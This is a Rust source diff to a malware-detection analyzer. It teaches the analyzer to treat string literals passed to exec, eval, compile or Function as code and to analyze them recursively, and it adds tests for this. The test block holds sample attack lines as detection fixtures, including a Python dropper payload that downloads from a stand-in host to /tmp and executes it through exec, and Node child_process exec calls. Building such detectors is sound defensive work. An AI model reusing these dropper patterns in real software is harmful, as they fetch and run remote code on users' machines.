@@ -7,8 +7,8 @@
 //! text for shell scripts and npm script commands.
 
 use crate::lexer::{
-    decoded_strings, joined_literals, lex, reversed_literals, strip_shell_comments, with_decoded,
-    with_reversed, Lang, TokKind, Token,
+    decoded_strings, joined_literals, lex, reversed_literals, strip_shell_comments, unescape_code,
+    with_decoded, with_reversed, Lang, TokKind, Token,
 };
 use regex::{Regex, RegexSet};
 use std::cell::OnceCell;
@@ -123,6 +123,31 @@ impl FileAnalysis {
         if self.hits.len() < MAX_HITS_PER_FILE {
             self.hits.push((ind, line));
         }
+    }
+
+    /// Add what was found in code run from a literal that starts on `line` (see
+    /// [`literal_code`]); `spans_lines` maps its lines onto the file's, otherwise every hit
+    /// lands on `line`. Line statistics stay with the file that holds the literal.
+    fn merge_nested(&mut self, inner: FileAnalysis, line: u32, spans_lines: bool) {
+        for (c, n) in self.counts.iter_mut().zip(inner.counts) {
+            *c += n;
+        }
+        let room = MAX_HITS_PER_FILE.saturating_sub(self.hits.len());
+        self.hits.extend(
+            inner
+                .hits
+                .into_iter()
+                .take(room)
+                .map(|(i, l)| (i, if spans_lines { line + l - 1 } else { line })),
+        );
+        self.max_str_entropy = self.max_str_entropy.max(inner.max_str_entropy);
+        self.str_entropy_sum += inner.str_entropy_sum;
+        self.n_entropy_strs += inner.n_entropy_strs;
+        self.longest_b64_run = self.longest_b64_run.max(inner.longest_b64_run);
+        self.hex_escapes += inner.hex_escapes;
+        self.n_idents += inner.n_idents;
+        self.n_obf_idents += inner.n_obf_idents;
+        self.relative_imports.extend(inner.relative_imports);
     }
 }
 
@@ -516,44 +541,117 @@ pub fn analyze(text: &str, lang: Lang) -> FileAnalysis {
     text_stats(&mut fa, text);
     match lang {
         Lang::Shell => analyze_shell(text, &mut fa),
-        Lang::Python | Lang::Js => {
-            let raw = lex(text, lang);
-            let decoded = decoded_strings(text, &raw, lang);
-            let dec = with_decoded(&raw, &decoded);
-            let revs = reversed_literals(&dec, lang);
-            let unrev = with_reversed(&dec, &revs);
-            let joins = joined_literals(&unrev, lang);
-            let toks = with_reversed(&unrev, &joins);
-            let runs = fold_runs(&toks, lang);
-            if runs.is_empty() {
-                analyze_code(&toks, &[], lang, &mut fa);
-            } else {
-                let folds: Vec<Fold> = runs.iter().map(|r| make_fold(&toks, &r.2)).collect();
-                let mut code = Vec::with_capacity(toks.len());
-                let mut fold_of = Vec::with_capacity(toks.len());
-                let mut i = 0;
-                for (r, f) in runs.iter().zip(&folds) {
-                    for t in &toks[i..r.0] {
-                        code.push(*t);
-                        fold_of.push(None);
-                    }
-                    code.push(Token {
-                        kind: TokKind::Str,
-                        text: &f.text,
-                        line: f.parts[0].1,
-                    });
-                    fold_of.push(Some(f));
-                    i = r.1;
-                }
-                for t in &toks[i..] {
-                    code.push(*t);
-                    fold_of.push(None);
-                }
-                analyze_code(&code, &fold_of, lang, &mut fa);
-            }
-        }
+        Lang::Python | Lang::Js => analyze_source(text, lang, &mut fa, 0),
     }
     fa
+}
+
+/// How deep code passed to `exec` as a literal is followed (`exec('exec("...")')`).
+const MAX_LITERAL_CODE_DEPTH: u32 = 3;
+
+/// Lex, decode and fold Python or JavaScript source, then run the rules over it. Code
+/// handed to `exec`/`eval` as a literal (see [`literal_code`]) is analyzed as code, not as
+/// a string, with its hits on the literal's line.
+fn analyze_source(text: &str, lang: Lang, fa: &mut FileAnalysis, depth: u32) {
+    let raw = lex(text, lang);
+    let decoded = decoded_strings(text, &raw, lang);
+    let dec = with_decoded(&raw, &decoded);
+    let revs = reversed_literals(&dec, lang);
+    let unrev = with_reversed(&dec, &revs);
+    let joins = joined_literals(&unrev, lang);
+    let toks = with_reversed(&unrev, &joins);
+    let runs = fold_runs(&toks, lang);
+    if runs.is_empty() {
+        let skip = nested_code(&toks, lang, fa, depth);
+        analyze_code(&toks, &[], &skip, lang, fa, depth == 0);
+    } else {
+        let folds: Vec<Fold> = runs.iter().map(|r| make_fold(&toks, &r.2)).collect();
+        let mut code = Vec::with_capacity(toks.len());
+        let mut fold_of = Vec::with_capacity(toks.len());
+        let mut i = 0;
+        for (r, f) in runs.iter().zip(&folds) {
+            for t in &toks[i..r.0] {
+                code.push(*t);
+                fold_of.push(None);
+            }
+            code.push(Token {
+                kind: TokKind::Str,
+                text: &f.text,
+                line: f.parts[0].1,
+            });
+            fold_of.push(Some(f));
+            i = r.1;
+        }
+        for t in &toks[i..] {
+            code.push(*t);
+            fold_of.push(None);
+        }
+        let skip = nested_code(&code, lang, fa, depth);
+        analyze_code(&code, &fold_of, &skip, lang, fa, depth == 0);
+    }
+}
+
+/// Analyze the literal code in `toks` into `fa`; returns the indices of those literals,
+/// which the caller then leaves out of its string rules so nothing is counted twice.
+fn nested_code(toks: &[Token<'_>], lang: Lang, fa: &mut FileAnalysis, depth: u32) -> Vec<usize> {
+    if depth >= MAX_LITERAL_CODE_DEPTH {
+        return Vec::new();
+    }
+    let mut lits = literal_code(toks, lang);
+    // Bundlers wrap each module of a development build in `eval("...")` and name it with a
+    // `//# sourceURL=` comment; reading those as code would put whole libraries in view.
+    lits.retain(|&k| {
+        !toks[k].text.contains("sourceURL=") && !toks[k].text.contains("sourceMappingURL=")
+    });
+    for &k in &lits {
+        let t = toks[k];
+        let mut inner = FileAnalysis::default();
+        analyze_source(&unescape_code(t.text), lang, &mut inner, depth + 1);
+        // A literal written over several lines keeps its lines; one written on a single
+        // line (with `\n` escapes) puts every hit on that line.
+        fa.merge_nested(inner, t.line, t.text.contains('\n'));
+    }
+    lits
+}
+
+/// String literals that are run as code: the first argument of Python `exec(...)`,
+/// `eval(...)` and `compile(...)`, and of JavaScript `eval(...)`, or the body (last
+/// argument) of `Function(...)` / `new Function(...)`. Indices into `toks`, in order.
+pub(crate) fn literal_code(toks: &[Token<'_>], lang: Lang) -> Vec<usize> {
+    let mut out = Vec::new();
+    for (i, t) in toks.iter().enumerate() {
+        if t.kind != TokKind::Ident || toks.get(i + 1).is_none_or(|n| n.text != "(") {
+            continue;
+        }
+        if i > 0 && toks[i - 1].text == "." && toks[i - 1].kind == TokKind::Punct {
+            continue;
+        }
+        let is_str = |k: usize| toks.get(k).is_some_and(|t| t.kind == TokKind::Str);
+        let is = |k: usize, x: &str| {
+            toks.get(k)
+                .is_some_and(|t| t.kind != TokKind::Str && t.text == x)
+        };
+        match (lang, t.text) {
+            (Lang::Python, "exec" | "eval" | "compile") | (Lang::Js, "eval") => {
+                // The code is the first argument; the rest are scopes, a file name or a mode.
+                if is_str(i + 2) && (is(i + 3, ")") || is(i + 3, ",")) {
+                    out.push(i + 2);
+                }
+            }
+            (Lang::Js, "Function") => {
+                // Literal parameter names, then the literal body.
+                let mut k = i + 2;
+                while is_str(k) && is(k + 1, ",") {
+                    k += 2;
+                }
+                if is_str(k) && is(k + 1, ")") {
+                    out.push(k);
+                }
+            }
+            _ => {}
+        }
+    }
+    out
 }
 
 fn analyze_shell(text: &str, fa: &mut FileAnalysis) {
@@ -572,10 +670,20 @@ fn analyze_shell(text: &str, fa: &mut FileAnalysis) {
 }
 
 /// `fold_of[i]` is the fold token `i` came from, if any (empty when nothing was folded).
-fn analyze_code(toks: &[Token<'_>], fold_of: &[Option<&Fold>], lang: Lang, fa: &mut FileAnalysis) {
+/// `skip` holds the (sorted) indices of literals already analyzed as code; `top` is false
+/// for such code itself, whose file-level rules are left to the file that holds it.
+fn analyze_code(
+    toks: &[Token<'_>],
+    fold_of: &[Option<&Fold>],
+    skip: &[usize],
+    lang: Lang,
+    fa: &mut FileAnalysis,
+    top: bool,
+) {
     // Strings and identifiers first: they feed both rules and statistics.
     for (k, t) in toks.iter().enumerate() {
         match t.kind {
+            TokKind::Str if skip.binary_search(&k).is_ok() => {}
             TokKind::Str => {
                 let fold = fold_of.get(k).copied().flatten();
                 match fold {
@@ -624,6 +732,9 @@ fn analyze_code(toks: &[Token<'_>], fold_of: &[Option<&Fold>], lang: Lang, fa: &
         Lang::Python => python_rules(toks, fa),
         Lang::Js => js_rules(toks, fa),
         Lang::Shell => {}
+    }
+    if !top {
+        return;
     }
     // Fetch + write + execute in one file is the classic dropper shape.
     if fa.counts[NETWORK] > 0 && fa.counts[FILE_WRITE] > 0 && fa.counts[PROC_EXEC] > 0 {
@@ -1284,6 +1395,69 @@ mod tests {
         );
         // Escapes are decoded first, and a reversed half still folds with its neighbour.
         assert_eq!(py("u = 'https://' + 'x/elpmaxe.l\\x69ve'[::-1]\n")[URL], 1);
+    }
+
+    #[test]
+    fn literal_code_is_analyzed_as_code() {
+        // Code run from a literal counts like the same code written out, plus the call.
+        let same = |wrapped: [u32; N_IND], plain: [u32; N_IND], extra_dyn: u32| {
+            for i in 0..N_IND {
+                let want = plain[i] + if i == DYN_CODE { extra_dyn } else { 0 };
+                assert_eq!(wrapped[i], want, "indicator {i}");
+            }
+        };
+        // The shape of a 2026 .pth dropper: the payload is a string handed to exec.
+        let payload = "import subprocess as _s,urllib.request as _u\n\
+                       _u.urlretrieve(\"https://evil.example/b\", \"/tmp/b\")\n\
+                       _s.Popen([\"/tmp/b\"])\n";
+        let wrapped = format!("exec('{}')\n", payload.replace('\n', "\\n"));
+        let c = py(&wrapped);
+        assert!(c[PROC_EXEC] >= 1 && c[NETWORK] >= 1 && c[URL] == 1);
+        same(c, py(payload), 1);
+        same(
+            py("exec(\"exec('import socket\\\\nsocket.socket()')\")\n"),
+            py("import socket\nsocket.socket()\n"),
+            2,
+        );
+        same(
+            py("exec(compile('import socket\\nsocket.socket()', '<x>', 'exec'))\n"),
+            py("import socket\nsocket.socket()\n"),
+            2,
+        );
+        // JavaScript eval and Function bodies; parameter names are not code.
+        let plain = js("require('child_process').exec('id')\n");
+        assert!(plain[PROC_EXEC] >= 1);
+        same(
+            js("eval(\"require('child_process').exec('id')\")\n"),
+            plain,
+            1,
+        );
+        same(
+            js("new Function('a', \"require('child_process').exec('id')\");\n"),
+            plain,
+            1,
+        );
+        // A URL inside the code is counted once, not again as part of the outer literal.
+        assert_eq!(py("exec(\"u = 'https://evil.example/x'\")\n")[URL], 1);
+        // A single-line literal puts every hit on its own line; a multi-line one keeps lines.
+        let fa = analyze(
+            "a = 1\nexec('import socket\\nsocket.socket()')\n",
+            Lang::Python,
+        );
+        assert!(fa.hits.contains(&(NETWORK, 2)));
+        let fa = analyze(
+            "a = 1\nexec('''\nimport socket\nsocket.socket()\n''')\n",
+            Lang::Python,
+        );
+        assert!(fa.hits.contains(&(NETWORK, 4)));
+        // Code that is not a literal, methods named exec, and bundler modules named by a
+        // sourceURL comment are left alone.
+        assert_eq!(py("exec(code)\n")[NETWORK], 0);
+        let bundled =
+            "eval(\"require('child_process').exec('id')\\n//# sourceURL=webpack:///./a.js\")\n";
+        assert_eq!(js(bundled)[PROC_EXEC], 0);
+        let c = py("cursor.exec('import socket\\nsocket.socket()')\n");
+        assert_eq!((c[NETWORK], c[DYN_CODE]), (0, 0));
     }
 
     #[test]
